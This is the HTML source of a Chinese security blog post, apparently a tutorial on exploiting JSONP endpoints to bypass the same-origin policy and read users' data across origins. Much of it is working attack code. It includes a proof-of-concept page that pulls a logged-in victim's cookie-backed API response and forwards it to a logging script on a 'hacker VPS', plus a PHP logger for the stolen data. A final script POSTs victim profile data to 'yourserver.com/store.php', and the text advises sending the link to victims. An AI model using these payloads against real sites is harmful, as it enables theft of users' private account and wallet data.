@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="jsonp简单利用JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。 动态创建&amp;lt;script&amp;gt;标签，设置其src，回调函数在src中设置： 123var script = document.createElement(&quot;script&quot;);script.src = &quot;ht">
+<meta name="keywords" content="csrf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jsonp漏洞">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/28/2018-12-28-JSONP漏洞/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="jsonp简单利用JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。 动态创建&amp;lt;script&amp;gt;标签，设置其src，回调函数在src中设置： 123var script = document.createElement(&quot;script&quot;);script.src = &quot;ht">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fylhxn4c2qj211z0ikacc.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvxq4new6j20sa0fnjs4.jpg">
+<meta property="og:image" content="https://miro.medium.com/max/1178/1*1euU-nfdxgtBGF7O6oNTgw.jpeg">
+<meta property="og:image" content="https://miro.medium.com/max/3101/1*-pfPrUZeXEqXJqGT55wRFQ.jpeg">
+<meta property="og:updated_time" content="2019-09-11T02:55:48.403Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="jsonp漏洞">
+<meta name="twitter:description" content="jsonp简单利用JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。 动态创建&amp;lt;script&amp;gt;标签，设置其src，回调函数在src中设置： 123var script = document.createElement(&quot;script&quot;);script.src = &quot;ht">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fylhxn4c2qj211z0ikacc.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/28/2018-12-28-JSONP漏洞/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>jsonp漏洞 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/28/2018-12-28-JSONP漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">jsonp漏洞
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-28 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-28T00:00:00+08:00">2018-12-28</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-11 10:55:48" itemprop="dateModified" datetime="2019-09-11T10:55:48+08:00">2019-09-11</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">7k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">6 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="jsonp简单利用"><a href="#jsonp简单利用" class="headerlink" title="jsonp简单利用"></a>jsonp简单利用</h1><p>JSONP 由两部分组成：<strong>回调函数</strong>和<strong>数据</strong>。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p>
+<p>动态创建<code>&lt;script&gt;</code>标签，设置其src，回调函数在src中设置：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">script.src = <span class="string">"https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.insertBefore(script, <span class="built_in">document</span>.body.firstChild);</span><br></pre></td></tr></table></figure>
+
+<p>在页面中，返回的JSON作为参数传入回调函数中，我们通过回调函数来来操作数据。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleResponse</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 对response数据进行操作代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>上面是简单直接的对JSONP 的描述，可能有些人不是很懂，我们下面一步一步分析</strong></p>
+<p><strong>第一种</strong></p>
+<p>① 用户携带cookie访问放置在黑客服务器的页面</p>
+<p>jsonp.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">$.getJSON(<span class="string">"http://127.0.0.1/csrf/api.php?calback=?"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">json</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="comment">// 这里填写目标接口</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> data=<span class="built_in">JSON</span>.stringify(json);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">$.<span class="keyword">get</span>("http://127.0.0.1/csrf/log.php?mylogs="+data,function(res,status)&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//将data转发记录,访问log.php</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//注意 这里写的是黑客vps的ip，由于是测试，我写127.0.0.1</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">alert (<span class="string">'ok'</span>) ;</span></span><br><span class="line"><span class="javascript"><span class="comment">//如果返回的jsonp的json数组，不是一个json对象。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//使用 alert(result[0].admin)</span></span></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引用一段如上请求为JS --&gt;</span><br><span class="line">&lt;script&gt;function jsonp2(data)&#123;alert(JSON.stringify(data));&#125;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://gh0st.cn/user/center?callback=jsonp2&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>api.php</p>
+<p>这里模拟靶机的接口</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:application/json'</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'callback'</span>].<span class="string">"(&#123;\"admin\":\""</span>.$_COOKIE[<span class="string">'admin'</span>].<span class="string">"\"&#125;)"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>log.php</p>
+<p>将json数据转存</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$time = date(<span class="string">"Y_m_d_h_i_s"</span>);</span><br><span class="line">	$filename = $time.<span class="string">"_"</span>.rand(<span class="number">1</span>,<span class="number">29999</span>).<span class="string">".txt"</span>;</span><br><span class="line">	$log = $_GET[mylogs];</span><br><span class="line">	$httpheader = <span class="string">"HTTP_HEADER\r\n"</span>;</span><br><span class="line">	<span class="keyword">foreach</span> (getallheaders() <span class="keyword">as</span> $name =&gt; $value)&#123;</span><br><span class="line">		$httpheader = $httpheader.<span class="string">"$name: $value\r\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> file_put_contents(filename, $httpheader.<span class="string">"\r\n"</span>.$log);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>②凡访问加载这个poc的页面的用户，他的投诉记录都会被我直接劫持，并且做记录</p>
+<p>之前在cors漏洞写到的开源脚本在这也可以配合使用</p>
+<p>接下来准备深入挖掘csrf类的漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fylhxn4c2qj211z0ikacc.jpg" alt></p>
+<p><strong>第二种</strong></p>
+<p>2.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>GoJSONP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">jsonhandle</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">"age:"</span> + data.age + <span class="string">"name:"</span> + data.name);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1.min.js"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/jsonp/remote.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>remote.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jsonhandle(&#123;</span><br><span class="line">    <span class="string">"age"</span> : <span class="number">15</span>,</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"John"</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：远程的js 代码不需要script标签</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvxq4new6j20sa0fnjs4.jpg" alt></p>
+<p><strong>第三种</strong></p>
+<p><strong>用下面的代码模jsonp的调用过程方便大家更好的理解jsonp的运行过程</strong></p>
+<p>3.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>GoJSONP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">jsonhandle</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">"age:"</span> + data.age + <span class="string">"name:"</span> + data.name);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1.min.js"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> url = <span class="string">"http://127.0.0.1/jsonp/test1.php?id=1&amp;callback=jsonhandle"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj = $(<span class="string">'&lt;script&gt;&lt;\/script&gt;'</span>);</span></span><br><span class="line"><span class="javascript">        obj.attr(<span class="string">"src"</span>,url);</span></span><br><span class="line"><span class="javascript">        $(<span class="string">"body"</span>).append(obj);</span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>test1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'age'</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="string">'name'</span> =&gt; <span class="string">'dada'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $callback.<span class="string">"("</span>.json_encode($data).<span class="string">")"</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/jsonp/test1.php?id=1&amp;callback=jsonhandle</code></p>
+<p>我们在scipt标签里面给出的链接是我远程服务器的一个php的代码，我给这个文件传递了一个参数，作为我要调用的函数。服务器接收到这个参数以后把它当做函数名，并给这个函数传递了一个json的值作为用户调用的函数的参数，最终实现调用的</p>
+<h1 id="利用JSONP和绕过引用检查"><a href="#利用JSONP和绕过引用检查" class="headerlink" title="利用JSONP和绕过引用检查"></a>利用JSONP和绕过引用检查</h1><p><strong>JSONP</strong>是<strong>（</strong> JSON With Padding），创建JSONP是为了授予对JavaScript的跨源读取访问权限，它作为<strong>SOP（</strong>同源策略<strong>）</strong>的例外，并允许跨源数据访问。它可用于绕过<strong>SOP</strong>以访问跨源数据。</p>
+<p>网站返回数据的API断点带有这样的回调函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src =“https:<span class="comment">//redact.com/api/user/profile?callback=call_me”&gt; &lt;/ script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在我们自己的vps创建脚本</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">call_me</span>(<span class="params">data</span>) </span>&#123;<span class="built_in">console</span>.log(data)&#125;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src=”https:/</span><span class="regexp">/redact.com/</span>api/user/profile?callback=call_me”&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>此代码将在浏览器<strong>控制台中</strong>记录数据。</p>
+<p>现在我们如何验证<strong>API</strong>是否容易受到此<strong>JSONP</strong>漏洞的攻击。</p>
+<p>① 我们有一个端点，它显示用户钱包数据<a href="https://user.redact.com/payment/wallet/balance" target="_blank" rel="noopener"><strong>https://user.redact.com/payment/wallet/balance</strong></a></p>
+<p><img src="https://miro.medium.com/max/1178/1*1euU-nfdxgtBGF7O6oNTgw.jpeg" alt="img"></p>
+<p>② 现在添加一个像这样的回调查询参数</p>
+<p><a href="https://user.redact.com/payment/wallet/balance?callback=call_me" target="_blank" rel="noopener"><strong>https://user.redact.com/payment/wallet/balance?callback=call_me</strong></a></p>
+<p>如果端点启用了<strong>JSONP</strong>，它将创建一个名为<strong>call_me</strong>的对象，并且所有数据都将在此对象内。</p>
+<p><img src="https://miro.medium.com/max/3101/1*-pfPrUZeXEqXJqGT55wRFQ.jpeg" alt="img"></p>
+<p>因此，这确认了端点支持<strong>JSONP</strong>并且可以被利用，现在我们将使用我之前解释过的相同JavaScript代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;function call_me(data) &#123;console.log(data)&#125;&lt;/script&gt;</span><br><span class="line">&lt;script src=”https://redact.com/api/user/profile?callback=call_me”&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>现在，您还可以创建一个<strong>.html文件</strong>，该<strong>文件</strong>将提取数据并将其存储在所需的服务器上。您只需将URL发送给受害者，然后您就可以编写自己的JavaScript代码将该数据发送到您的服务器，就像这样。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call_me</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = ‘https:<span class="comment">//yourserver.com/store.php';</span></span><br><span class="line"><span class="keyword">var</span> params = ‘data=’+<span class="built_in">JSON</span>.stringify(response);</span><br><span class="line">http.open(‘POST’, url, <span class="literal">true</span>);</span><br><span class="line">http.setRequestHeader(‘Content-type’, ‘application/x-www-form-urlencoded’);</span><br><span class="line">http.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(http.readyState == <span class="number">4</span> &amp;&amp; http.status == <span class="number">200</span>) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(http.responseText);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">http.send(params);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src=”https:/</span><span class="regexp">/user.redact.com/</span>api/user/profile?callback=call_me<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
